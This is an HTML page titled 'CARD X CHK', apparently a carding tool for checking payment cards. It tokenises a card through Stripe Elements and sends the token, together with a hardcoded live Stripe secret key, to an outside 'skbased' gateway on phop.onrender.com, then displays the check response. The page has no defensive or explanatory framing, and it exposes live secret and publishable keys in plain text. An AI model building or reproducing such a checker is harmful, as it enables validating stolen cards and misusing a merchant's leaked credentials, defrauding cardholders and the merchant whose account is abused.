<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>CARD X CHK</title>
  <script src="https://js.stripe.com/v3/"></script>
  <style>
    :root {
      --bg: #0a0e14;
      --card: #1a2028;
      --text: #d1d5db;
      --neon-blue: #00f0ff;
      --neon-green: #00ff00;
      --border: #2d3748;
      --shadow: 0 12px 36px rgba(0, 0, 0, 0.6);
      --radius: 12px;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'IBM Plex Mono', monospace;
      background: var(--bg);
      color: var(--text);
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 32px;
      position: relative;
      overflow: hidden;
    }
    canvas {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      opacity: 0.8;
    }
    .card {
      width: 100%;
      max-width: 1200px;
      background: var(--card);
      border: 2px solid var(--border);
      border-radius: var(--radius);
      box-shadow: var(--shadow), 0 0 30px rgba(0, 240, 255, 0.4);
      padding: 40px;
      display: grid;
      grid-template-columns: 1fr 2fr;
      gap: 40px;
      z-index: 1;
    }
    .panel { padding: 16px; }
    .form-card {
      background: #222b33;
      border: 3px solid var(--neon-blue);
      border-radius: var(--radius);
      padding: 32px;
      box-shadow: 0 0 20px var(--neon-blue);
      position: relative;
    }
    .form-card:hover {
      animation: glitch 0.3s linear infinite;
    }
    .stripe-element {
      padding: 20px;
      border: 3px solid var(--neon-blue);
      border-radius: 10px;
      background: #0a0e14;
      color: var(--text);
      font-size: 18px;
    }
    .actions {
      margin-top: 20px;
      display: flex;
      justify-content: flex-end;
    }
    .btn {
      background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
      color: #000;
      border: none;
      padding: 16px 32px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      text-transform: uppercase;
      transition: transform 0.2s, box-shadow 0.2s;
      position: relative;
    }
    .btn:hover {
      transform: translateY(-4px);
      box-shadow: 0 0 25px var(--neon-green), 0 0 25px var(--neon-blue);
      animation: glitch 0.3s linear infinite;
    }
    .btn[disabled] {
      opacity: 0.4;
      cursor: not-allowed;
      animation: none;
    }
    @keyframes glitch {
      0% { transform: translate(0); }
      20% { transform: translate(-2px, 2px); }
      40% { transform: translate(-2px, -2px); }
      60% { transform: translate(2px, 2px); }
      80% { transform: translate(2px, -2px); }
      100% { transform: translate(0); }
    }
    .right-panel {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 32px;
      background: #222b33;
      border: 3px solid var(--border);
      border-radius: var(--radius);
      padding: 32px;
      box-shadow: 0 0 20px var(--neon-blue);
    }
    .sub-panel {
      display: flex;
      flex-direction: column;
    }
    .sub-panel-title {
      font-size: 18px;
      font-weight: 600;
      color: var(--neon-green);
      margin-bottom: 16px;
      text-transform: uppercase;
      letter-spacing: 2px;
      text-shadow: 0 0 8px var(--neon-green);
    }
    .result {
      font-family: 'IBM Plex Mono', monospace;
      font-size: 16px;
      background: #0a0e14;
      color: var(--text);
      padding: 20px;
      border: 3px solid var(--neon-blue);
      border-radius: 10px;
      overflow: auto;
      max-height: 520px;
      white-space: pre-wrap;
      flex: 1;
      box-shadow: inset 0 0 8px rgba(0, 240, 255, 0.4);
    }
    footer {
      margin-top: auto;
      padding: 32px 0;
      text-align: center;
      width: 100%;
      z-index: 1;
      position: absolute;
      bottom: 0;
      left: 0;
    }
    .developed-by {
      font-size: 20px;
      color: var(--neon-blue);
      text-shadow: 0 0 12px var(--neon-blue), 0 0 24px var(--neon-blue);
      margin-bottom: 8px;
      letter-spacing: 3px;
      text-transform: uppercase;
    }
    .copyright {
      font-size: 14px;
      color: var(--text);
      opacity: 0.6;
    }
    @media (max-width: 768px) {
      .card { grid-template-columns: 1fr; }
      .right-panel { grid-template-columns: 1fr; gap: 20px; }
    }
  </style>
</head>
<body>
  <canvas id="matrix"></canvas>
  <div class="card" role="main">
    <div class="panel">
      <div class="form-card">
        <div id="card-element" class="stripe-element"></div>
        <div class="actions">
          <button id="checkBtn" class="btn">Check</button>
        </div>
      </div>
    </div>
    <div class="panel right-panel">
      <div class="sub-panel">
        <div class="sub-panel-title">Token</div>
        <div id="token-result" class="result"></div>
      </div>
      <div class="sub-panel">
        <div class="sub-panel-title">Check Response</div>
        <div id="result" class="result"></div>
      </div>
    </div>
  </div>
  <footer>
    <div class="developed-by">Developed by kคli liຖนxx</div>
    <div class="copyright">© All Rights Reserved</div>
  </footer>
  <script>
    // Matrix Rain and Electric Shocks Background
    (function() {
      const canvas = document.getElementById('matrix');
      const ctx = canvas.getContext('2d');
      canvas.height = window.innerHeight;
      canvas.width = window.innerWidth;
      const chars = '01abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*';
      const fontSize = 14;
      const columns = Math.floor(canvas.width / fontSize);
      const drops = Array(columns).fill(0);
      const shocks = [];

      // Generate electric shock
      function createShock() {
        const x = Math.random() * canvas.width;
        const y = 0;
        const length = 100 + Math.random() * 200;
        const segments = [];
        let currentY = y;
        while (currentY < y + length && currentY < canvas.height) {
          segments.push({
            x: x + (Math.random() - 0.5) * 20,
            y: currentY
          });
          currentY += 10 + Math.random() * 20;
        }
        shocks.push({ segments, opacity: 1, time: 0 });
      }

      // Draw matrix rain and shocks
      function draw() {
        ctx.fillStyle = 'rgba(10, 14, 20, 0.08)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        // Matrix rain
        ctx.fillStyle = 'var(--neon-green)';
        ctx.font = `${fontSize}px IBM Plex Mono`;
        for (let i = 0; i < drops.length; i++) {
          const text = chars.charAt(Math.floor(Math.random() * chars.length));
          const x = i * fontSize;
          const y = drops[i] * fontSize;
          ctx.fillText(text, x, y);
          if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
          drops[i]++;
        }

        // Electric shocks
        shocks.forEach((shock, index) => {
          ctx.beginPath();
          ctx.strokeStyle = `rgba(0, 240, 255, ${shock.opacity})`;
          ctx.lineWidth = 2;
          ctx.moveTo(shock.segments[0].x, shock.segments[0].y);
          for (let i = 1; i < shock.segments.length; i++) {
            ctx.lineTo(shock.segments[i].x, shock.segments[i].y);
          }
          ctx.stroke();
          shock.opacity -= 0.02;
          shock.time += 1;
          if (shock.opacity <= 0) shocks.splice(index, 1);
        });

        // Randomly add new shocks
        if (Math.random() < 0.05) createShock();
      }

      setInterval(draw, 50);
      window.addEventListener('resize', () => {
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;
        drops.length = Math.floor(canvas.width / fontSize);
        drops.fill(0);
      });
    })();

    // Stripe Integration
    (async () => {
      const API_ENDPOINT_BASE = "https://phop.onrender.com/gateway=skbased/key=rockysoon";
      const SK_KEY = "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";
      const PK = "pk_live_51049Hm4QFaGycgRKOIbupRw7rf65FJESmPqWZk9Jtpf2YCvxnjMAFX7dOPAgoxv9M2wwhi5OwFBx1EzuoTxNzLJD00ViBbMvkQ";
      const checkBtn = document.getElementById('checkBtn');
      const tokenResultEl = document.getElementById('token-result');
      const resultEl = document.getElementById('result');
      let stripe = null;
      let elements = null;
      let card = null;

      function setTokenResult(text) { tokenResultEl.textContent = text; }
      function setHtmlTokenResult(obj) { tokenResultEl.textContent = JSON.stringify(obj, null, 2); }
      function setResult(text) { resultEl.textContent = text; }
      function setHtmlResult(obj) { resultEl.textContent = JSON.stringify(obj, null, 2); }

      function initStripe() {
        if (card) { card.unmount(); card = null; elements = null; stripe = null; }
        try {
          stripe = Stripe(PK);
          elements = stripe.elements();
          const style = {
            base: {
              fontFamily: '"IBM Plex Mono", monospace',
              fontSize: '18px',
              color: 'var(--neon-green)',
              '::placeholder': { color: '#6b7280' },
              lineHeight: '32px'
            },
            invalid: {
              color: '#ff5555'
            }
          };
          card = elements.create('card', {
            style,
            hidePostalCode: true,
            classes: { base: 'stripe-element' }
          });
          card.mount('#card-element');
          card.on('change', (e) => {
            if (e.error) {
              setTokenResult(e.error.message);
              setResult('');
            } else {
              setTokenResult('');
              setResult('');
            }
          });
        } catch (err) {
          setTokenResult('Stripe init error: ' + err.message);
          setResult('');
        }
      }

      async function tokenizeAndSend() {
        if (!stripe || !card) {
          setTokenResult('Stripe not initialized');
          setResult('');
          checkBtn.disabled = false;
          return;
        }
        setTokenResult('Processing...');
        setResult('Processing...');
        const { token, error } = await stripe.createToken(card);
        if (error) {
          setTokenResult(error.message);
          setResult('');
          checkBtn.disabled = false;
          return;
        }
        setHtmlTokenResult(token);
        try {
          const url = `${API_ENDPOINT_BASE}?sk_key=${encodeURIComponent(SK_KEY)}&token=${encodeURIComponent(token.id)}`;
          const resp = await fetch(url, { method: "GET" });
          const text = await resp.text();
          try {
            const json = JSON.parse(text);
            setHtmlResult(json);
          } catch {
            setResult(text);
          }
        } catch (err) {
          setResult('API error: ' + err.message);
        }
        checkBtn.disabled = false;
        initStripe(); // Reset card input after processing
      }

      initStripe();

      checkBtn.addEventListener('click', () => {
        checkBtn.disabled = true;
        tokenizeAndSend();
      });
    })();
  </script>
</body>
</html>
